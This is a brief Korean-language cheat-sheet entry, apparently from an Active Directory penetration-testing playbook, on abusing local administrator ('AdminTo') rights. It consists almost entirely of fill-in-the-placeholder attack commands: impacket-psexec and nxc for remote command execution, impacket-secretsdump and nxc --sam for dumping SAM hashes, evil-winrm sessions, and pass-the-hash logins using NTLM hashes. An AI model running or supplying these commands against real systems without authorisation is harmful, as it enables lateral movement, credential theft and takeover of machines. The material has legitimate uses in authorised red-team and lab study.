# 08_AdminTo

로컬 관리자 권한. 발견 즉시 PtH, 원격 코드 실행, 해시 덤프가 가능하다.

```bash
# 원격 실행 (SMB 445)
impacket-psexec <도메인>/<공격자계정>:'<패스워드>'@<대상IP>  # ← 수정
nxc smb <대상IP> -u <공격자계정> -p '<패스워드>' -x 'whoami'

# 로컬 해시 덤프
impacket-secretsdump <도메인>/<공격자계정>:'<패스워드>'@<대상IP>
nxc smb <대상IP> -u <공격자계정> -p '<패스워드>' --sam

# WinRM (포트 5985)
evil-winrm -i <대상IP> -u <공격자계정> -p '<패스워드>'  # ← 수정

# PtH — 패스워드 없이 NTLM 해시로
impacket-psexec -hashes :<NTLM> <도메인>/<공격자계정>@<대상IP>  # ← 수정
evil-winrm -i <대상IP> -u <공격자계정> -H <NTLM>
```